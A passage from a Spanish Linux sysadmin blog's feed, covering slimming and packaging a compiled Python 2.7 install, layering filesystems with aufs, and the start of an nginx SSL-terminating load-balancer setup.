Type &lt;span class="s2"&gt;&amp;quot;help&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;copyright&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;credits&amp;quot;&lt;/span&gt; or &lt;span class="s2"&gt;&amp;quot;license&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; more information.
&amp;gt;&amp;gt;&amp;gt; import os
&amp;gt;&amp;gt;&amp;gt; os.uname&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Linux&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;foundry&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;3.10.0-327.10.1.el7.x86_64&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;#1 SMP Sat Jan 23 04:54:55 EST 2016&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;x86_64&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; exit&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto lo damos por bueno.&lt;/p&gt;
&lt;h2&gt;Opcional: reduciendo el espacio ocupado en disco&lt;/h2&gt;
&lt;p&gt;Nos posicionamos en la carpeta para analizar lo que ocupa.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry Python-2.7.11&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; /opt/python27/
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Miramos lo que ocupa cada carpeta dentro de la carpeta contendora.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ du -sh * &lt;span class="p"&gt;|&lt;/span&gt; sort -h
16K     share
676K    include
&lt;span class="m"&gt;6&lt;/span&gt;.1M    bin
94M     lib
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El paso mas obvio es lanzar el comando &lt;strong&gt;strip&lt;/strong&gt;. Esto va a eliminar los símbolos de &lt;em&gt;debug&lt;/em&gt; y va a reducir el tamaño de los binarios y las librerías &lt;em&gt;.so&lt;/em&gt;. El resto va a ignorarse, previo mensaje de error, que vamos a ignorar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ find -type f &lt;span class="p"&gt;|&lt;/span&gt; sudo xargs strip &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ du -sh * &lt;span class="p"&gt;|&lt;/span&gt; sort -h
16K     share
676K    include
&lt;span class="m"&gt;1&lt;/span&gt;.8M    bin
76M     lib
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Algo hemos ganado; se han liberado unos 24 mb. Como nos resulta insuficiente, inspeccionemos la carpeta mas grande, que es la carpeta &lt;em&gt;lib/&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ du -sh lib/* &lt;span class="p"&gt;|&lt;/span&gt; sort -h
&lt;span class="m"&gt;4&lt;/span&gt;.0K    lib/pkgconfig
&lt;span class="m"&gt;1&lt;/span&gt;.8M    lib/libpython2.7.a
74M     lib/python2.7
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La librería &lt;em&gt;libpython2.7.a&lt;/em&gt; es necesaria para compilar estáticamente binarios que vayan a incorporar la librería de &lt;em&gt;python&lt;/em&gt;. En este caso no la necesitamos y podemos liberar 1.8 mb adicionales.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ sudo rm lib/libpython2.7.a
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ du -sh * &lt;span class="p"&gt;|&lt;/span&gt; sort -h
16K     share
676K    include
&lt;span class="m"&gt;1&lt;/span&gt;.8M    bin
73M     lib
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Continuamos mirando la carpeta mas grande, que es &lt;em&gt;lib/python2.7/&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ du -sh lib/python2.7/* &lt;span class="p"&gt;|&lt;/span&gt; sort -h &lt;span class="p"&gt;|&lt;/span&gt; tail -5
&lt;span class="m"&gt;2&lt;/span&gt;.9M    lib/python2.7/encodings
&lt;span class="m"&gt;3&lt;/span&gt;.1M    lib/python2.7/idlelib
&lt;span class="m"&gt;3&lt;/span&gt;.4M    lib/python2.7/distutils
&lt;span class="m"&gt;3&lt;/span&gt;.5M    lib/python2.7/lib-dynload
29M     lib/python2.7/test
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es bastante inútil que el &lt;em&gt;runtime&lt;/em&gt; de &lt;em&gt;python&lt;/em&gt; incluya los tests que usan los desarrolladores de &lt;em&gt;python&lt;/em&gt;, y son 29 mb que podemos eliminar de forma segura.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ sudo rm -R lib/python2.7/test/
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ du -sh * &lt;span class="p"&gt;|&lt;/span&gt; sort -h
16K     share
676K    include
&lt;span class="m"&gt;1&lt;/span&gt;.8M    bin
44M     lib
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si miramos el contenido de la carpeta con detenimiento, podemos ver que cada módulo tiene 3 versiones: &lt;em&gt;.py&lt;/em&gt;, &lt;em&gt;.pyc&lt;/em&gt; y &lt;em&gt;.pyo&lt;/em&gt;; se trata del módulo en versión código, compilado y optimizado, respectivamente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ ls -lh lib/python2.7/os.*
-rw-r--r--. &lt;span class="m"&gt;1&lt;/span&gt; root root 26K Mar &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;:43 lib/python2.7/os.py
-rw-r--r--. &lt;span class="m"&gt;1&lt;/span&gt; root root 26K Mar &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;:43 lib/python2.7/os.pyc
-rw-r--r--. &lt;span class="m"&gt;1&lt;/span&gt; root root 26K Mar &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;:43 lib/python2.7/os.pyo
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Realmente solo se necesita la versión &lt;em&gt;.py&lt;/em&gt;, siendo las otras para acelerar la carga del módulo. Los otros se crean al importar el módulo, y si es posible, se escriben de nuevo en la carpeta. Vamos a borrarlas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ find -name &lt;span class="s2"&gt;&amp;quot;*.pyo&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo xargs rm
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ find -name &lt;span class="s2"&gt;&amp;quot;*.pyc&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo xargs rm
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ du -sh * &lt;span class="p"&gt;|&lt;/span&gt; sort -h
16K     share
676K    include
&lt;span class="m"&gt;1&lt;/span&gt;.8M    bin
21M     lib
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mucho mejor, pero... ¿sigue funcionando &lt;strong&gt;python&lt;/strong&gt;? Lo comprobamos como antes, y vemos que si. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ ./bin/python -V
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.11
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$ ./bin/python -c &lt;span class="s2"&gt;&amp;quot;import os; print os.uname()&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Linux&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;foundry&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;3.10.0-327.10.1.el7.x86_64&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;#1 SMP Sat Jan 23 04:54:55 EST 2016&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;x86_64&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry python27&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Empaquetado para usos futuros&lt;/h2&gt;
&lt;p&gt;Esta carpeta va a servir para todas las máquinas &lt;em&gt;CentOS&lt;/em&gt; y &lt;em&gt;RedHat&lt;/em&gt; versión 6, con la misma família de procesador (en este caso x86_64). Hacemos un fichero comprimido y lo ponemos a buen recaudo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry opt&lt;span class="o"&gt;]&lt;/span&gt;$ tar czf ~/python27.tar.gz python27/
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry opt&lt;span class="o"&gt;]&lt;/span&gt;$ ls -lh ~
total &lt;span class="m"&gt;7&lt;/span&gt;.2M
-rw-rw-r--. &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard &lt;span class="m"&gt;7&lt;/span&gt;.2M Mar &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;17&lt;/span&gt;:01 python27.tar.gz
&lt;span class="o"&gt;[&lt;/span&gt;gerard@foundry opt&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Poco mas de 7 mb... nada mal, ¿no?&lt;/p&gt;</content><category term="linux"></category><category term="redhat"></category><category term="centos"></category><category term="python"></category></entry><entry><title>Sistemas de ficheros multicapa con aufs</title><link href="http://www.linuxsysadmin.ml/2016/03/sistemas-de-ficheros-multicapa-con-aufs.html" rel="alternate"></link><published>2016-03-28T08:00:00+02:00</published><updated>2016-03-28T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-03-28:/2016/03/sistemas-de-ficheros-multicapa-con-aufs.html</id><summary type="html">&lt;p&gt;Trabajando con contenedores tenemos una parte que se repite: el sistema de ficheros base, que copiamos siempre. Otras veces nos puede interesar hacer un sistema capaz de descartar los cambios desde un punto inicial. Podemos crear una capa base de solo lectura y añadir otra capa de cambios con &lt;strong&gt;aufs …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Trabajando con contenedores tenemos una parte que se repite: el sistema de ficheros base, que copiamos siempre. Otras veces nos puede interesar hacer un sistema capaz de descartar los cambios desde un punto inicial. Podemos crear una capa base de solo lectura y añadir otra capa de cambios con &lt;strong&gt;aufs&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;La idea es crear un sistema de ficheros que sea el resultado de mezclar otros dos: una capa de solo lectura y una capa de cambios, que podría ser de lectura y escritura. Esta nueva capa puede, a su vez, servir de base para otro sistema de ficheros.&lt;/p&gt;
&lt;p&gt;De hecho, esta técnica de "apilado" se utiliza en la distribución de pendrive llamada &lt;a href="http://www.slax.org/"&gt;Slax&lt;/a&gt;. Mediante el apilado de módulos, mas una capa final de cambios, consiguen crear un sistema de ficheros linux entero, con una capa de cambios que se puede descartar en cualquier momento.&lt;/p&gt;
&lt;p&gt;Empezaremos con un sistema de ficheros simulado en una carpeta, que llamaremos &lt;em&gt;base&lt;/em&gt;. También pondremos una carpeta &lt;em&gt;unified&lt;/em&gt; que va a ser el sistema de ficheros resultante, y una carpeta &lt;em&gt;changes&lt;/em&gt; que va a alojar los cambios del sistema de ficheros respecto al sistema &lt;em&gt;base&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tree
.
├── base
│   ├── bin
│   │   └── hello.sh
│   └── conf
│       └── hello.conf
├── changes
└── unified

&lt;span class="m"&gt;5&lt;/span&gt; directories, &lt;span class="m"&gt;2&lt;/span&gt; files
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para esta demostración nos vale poca cosa, por ejemplo un binario y su configuración. En casos algo mas complejos podría tratarse de una jaula entera de sistema operativo.&lt;/p&gt;
&lt;p&gt;La "aplicación" y su configuración son simples, se muestran como guía, para ver como lo evolucionamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat base/bin/hello.sh
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nb"&gt;source&lt;/span&gt; conf/hello.conf

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hello &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;NAME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;!&amp;quot;&lt;/span&gt;
root@server:~# cat base/conf/hello.conf
&lt;span class="nv"&gt;NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Gerard&amp;quot;&lt;/span&gt;
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos a crear el sistema combinado en la carpeta &lt;em&gt;unified&lt;/em&gt;, usando la &lt;em&gt;base&lt;/em&gt; como capa de solo lectura, y la carpeta &lt;em&gt;changes&lt;/em&gt; como la capa de lectura escritura.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mount -t aufs -o br:changes&lt;span class="o"&gt;=&lt;/span&gt;rw:base&lt;span class="o"&gt;=&lt;/span&gt;ro none unified
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que la carpeta &lt;em&gt;unified&lt;/em&gt; es una unión de la capa base con la de cambios. Puesto que no hay cambios, por ahora las carpetas coinciden en contenido.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tree
.
├── base
│   ├── bin
│   │   └── hello.sh
│   └── conf
│       └── hello.conf
├── changes
└── unified
    ├── bin
    │   └── hello.sh
    └── conf
        └── hello.conf

&lt;span class="m"&gt;7&lt;/span&gt; directories, &lt;span class="m"&gt;4&lt;/span&gt; files
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De ahora en adelante, solo queda trabajar con el sistema de ficheros &lt;em&gt;unified&lt;/em&gt;, así que vamos a trabajar en esa carpeta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# &lt;span class="nb"&gt;cd&lt;/span&gt; unified/
root@server:~/unified#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si ejecutamos el binario, vemos que reacciona como se supone que debe hacerlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~/unified# ./bin/hello.sh
Hello Gerard!
root@server:~/unified#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En un momento dado, vemos que queremos modificar un fichero, por ejemplo, el de configuración, cambiando el parámetro &lt;strong&gt;NAME&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~/unified# cat conf/hello.conf
&lt;span class="nv"&gt;NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Gerard Monells&amp;quot;&lt;/span&gt;
root@server:~/unified#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Efectivamente, el resultado es el esperado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~/unified# ./bin/hello.sh
Hello Gerard Monells!
root@server:~/unified#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos a crear nuevas carpetas y nuevos ficheros, por ejemplo, una carpeta &lt;em&gt;data&lt;/em&gt; con un fichero &lt;em&gt;greetings&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~/unified# mkdir data
root@server:~/unified# ./bin/hello.sh &amp;gt; data/greetings
root@server:~/unified#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Volvemos al nivel de carpetas anteriores, para investigar lo que está pasando.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~/unified# &lt;span class="nb"&gt;cd&lt;/span&gt; ..
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que el sistema &lt;em&gt;base&lt;/em&gt; ha quedado intacto. De la misma forma, todas las modificaciones respecto a la base se han almacenado en la carpeta &lt;em&gt;changes&lt;/em&gt;. En conjunto, nos queda la carpeta &lt;em&gt;unified&lt;/em&gt; con la suma de ambos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tree
.
├── base
│   ├── bin
│   │   └── hello.sh
│   └── conf
│       └── hello.conf
├── changes
│   ├── conf
│   │   └── hello.conf
│   └── data
│       └── greetings
└── unified
    ├── bin
    │   └── hello.sh
    ├── conf
    │   └── hello.conf
    └── data
        └── greetings

&lt;span class="m"&gt;10&lt;/span&gt; directories, &lt;span class="m"&gt;7&lt;/span&gt; files
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es fácil intuir que el fichero &lt;em&gt;greetings&lt;/em&gt; es el de la capa de cambios, ya que no hay otro. En el caso del fichero &lt;em&gt;hello.conf&lt;/em&gt; modificado, se ha modificado el de la capa de cambios, y es el que vemos en el punto de montaje &lt;em&gt;unified&lt;/em&gt;, aunque hayan dos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat base/conf/hello.conf
&lt;span class="nv"&gt;NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Gerard&amp;quot;&lt;/span&gt;
root@server:~# cat unified/conf/hello.conf
&lt;span class="nv"&gt;NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Gerard Monells&amp;quot;&lt;/span&gt;
root@server:~# cat changes/conf/hello.conf
&lt;span class="nv"&gt;NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Gerard Monells&amp;quot;&lt;/span&gt;
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: el sistema de ficheros de solo lectura &lt;em&gt;base&lt;/em&gt; no tiene porque estar en una carpeta; podría tratarse se un sistema de fichero simulado montado en un fichero, montado mediante un &lt;strong&gt;mount -o loop&lt;/strong&gt;; por ejemplo, un sistema de ficheros &lt;strong&gt;squashfs&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;De hecho, como la capa &lt;em&gt;base&lt;/em&gt; no se modifica, nada nos impide crear otro sistema de ficheros, a base de sumar esta misma &lt;em&gt;base&lt;/em&gt; con otra capa de cambios.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir changes2 unified2
root@server:~# mount -t aufs -o br:changes2&lt;span class="o"&gt;=&lt;/span&gt;rw:base&lt;span class="o"&gt;=&lt;/span&gt;ro none unified2
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos dos sistemas de ficheros, &lt;em&gt;unified&lt;/em&gt; y &lt;em&gt;unified2&lt;/em&gt;, que comparten una capa &lt;em&gt;base&lt;/em&gt; común.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tree
.
├── base
│   ├── bin
│   │   └── hello.sh
│   └── conf
│       └── hello.conf
├── changes
│   ├── conf
│   │   └── hello.conf
│   └── data
│       └── greetings
├── changes2
├── unified
│   ├── bin
│   │   └── hello.sh
│   ├── conf
│   │   └── hello.conf
│   └── data
│       └── greetings
└── unified2
    ├── bin
    │   └── hello.sh
    └── conf
        └── hello.conf

&lt;span class="m"&gt;14&lt;/span&gt; directories, &lt;span class="m"&gt;9&lt;/span&gt; files
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso no supone mucho ahorro, ya que la capa base es pequeña, pero... ¿os imagináis que la capa base es una jaula entera resultado de un &lt;strong&gt;debootstrap&lt;/strong&gt;?&lt;/p&gt;
&lt;p&gt;De hecho, esta capa &lt;em&gt;base&lt;/em&gt; compartida no hay que copiarla, con lo que ganamos tiempo al crear una jaula grande, y además, si lo juntamos con &lt;strong&gt;squashfs&lt;/strong&gt; podemos ahorrar bastante espacio.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="mount"></category><category term="aufs"></category><category term="squashfs"></category><category term="debootstrap"></category></entry><entry><title>Creando un entorno escalable (IV)</title><link href="http://www.linuxsysadmin.ml/2016/03/creando-un-entorno-escalable-4.html" rel="alternate"></link><published>2016-03-21T08:00:00+01:00</published><updated>2016-03-21T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-03-21:/2016/03/creando-un-entorno-escalable-4.html</id><summary type="html">&lt;p&gt;Acabamos el artículo anterior de esta serie con las aplicaciones corriendo en sus respectivas máquinas. En este artículo vamos a poner una fachada a todo el sistema, mediante un &lt;em&gt;proxy HTTP&lt;/em&gt; que haga las funciones de terminación &lt;em&gt;SSL&lt;/em&gt; y de &lt;em&gt;balanceador&lt;/em&gt;, exponiendo todo el sistema en una sola dirección IP …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Acabamos el artículo anterior de esta serie con las aplicaciones corriendo en sus respectivas máquinas. En este artículo vamos a poner una fachada a todo el sistema, mediante un &lt;em&gt;proxy HTTP&lt;/em&gt; que haga las funciones de terminación &lt;em&gt;SSL&lt;/em&gt; y de &lt;em&gt;balanceador&lt;/em&gt;, exponiendo todo el sistema en una sola dirección IP.&lt;/p&gt;
&lt;p&gt;Como &lt;em&gt;proxy HTTP&lt;/em&gt; tenemos varias opciones; solo se necesita un servidor web que soporte &lt;em&gt;virtual hosts&lt;/em&gt;, protocolo HTTP sobre SSL, capacidad de hacer de &lt;em&gt;proxy&lt;/em&gt; y capacidad para balancear las peticiones entre varias opciones.&lt;/p&gt;
&lt;p&gt;Si analizamos estos requisitos, podemos comprobar que las opciones son muchas; desde el todopoderoso &lt;strong&gt;apache&lt;/strong&gt; al &lt;strong&gt;nginx&lt;/strong&gt;, pasando por soluciones de balanceador puro como &lt;strong&gt;haproxy&lt;/strong&gt;, u opciones mas esotéricas como &lt;strong&gt;squid&lt;/strong&gt;. En este caso, se utiliza &lt;strong&gt;nginx&lt;/strong&gt; por su facilidad de uso y su bajo consumo de recursos. Cumple con el subconjunto básico de funcionalidades necesario, pero no dispone de tantos algoritmos de balanceo como otras opciones.&lt;/p&gt;
&lt;h2&gt;Instalación de paquetes&lt;/h2&gt;
&lt;p&gt;Empezamos instalando los requisitos para nuestra fachada; en principio solo se necesitaría el servidor web &lt;strong&gt;nginx&lt;/strong&gt; (en la versión mínima) y &lt;strong&gt;openssl&lt;/strong&gt; para generar los certificados. Adicionalmente instalaremos &lt;strong&gt;curl&lt;/strong&gt; para comprobar que el resultado es correcto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@frontend:~# apt-get install nginx-light curl
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes extras:
  ca-certificates libcurl3 libffi6 libgmp10 libgnutls-deb0-28 libhogweed2 libidn11 libldap-2.4-2 libnettle4 libp11-kit0 librtmp1
  libsasl2-2 libsasl2-modules libsasl2-modules-db libssh2-1 libtasn1-6 nginx-common openssl
Paquetes sugeridos:
  gnutls-bin libsasl2-modules-otp libsasl2-modules-ldap libsasl2-modules-sql libsasl2-modules-gssapi-mit
  libsasl2-modules-gssapi-heimdal fcgiwrap nginx-doc ssl-cert
Se instalarán los siguientes paquetes NUEVOS:
  ca-certificates curl libcurl3 libffi6 libgmp10 libgnutls-deb0-28 libhogweed2 libidn11 libldap-2.4-2 libnettle4 libp11-kit0
  librtmp1 libsasl2-2 libsasl2-modules libsasl2-modules-db libssh2-1 libtasn1-6 nginx-common nginx-light openssl
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;20&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;4&lt;/span&gt;.077 kB de archivos.
Se utilizarán &lt;span class="m"&gt;8&lt;/span&gt;.832 kB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
root@frontend:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El paquete &lt;strong&gt;nginx&lt;/strong&gt; de la distribución &lt;em&gt;Debian&lt;/em&gt; viene con una configuración por defecto en &lt;em&gt;/etc/nginx/sites-enabled/&lt;/em&gt;, que vamos a eliminar para evitar que se pise con nuestras configuraciones.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@frontend:~# ls -lh /etc/nginx/sites-enabled/
total &lt;span class="m"&gt;0&lt;/span&gt;
lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;34&lt;/span&gt; feb &lt;span class="m"&gt;26&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:28 default -&amp;gt; /etc/nginx/sites-available/default
root@frontend:~# unlink /etc/nginx/sites-enabled/default
root@frontend:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Consideraciones de seguridad&lt;/h2&gt;
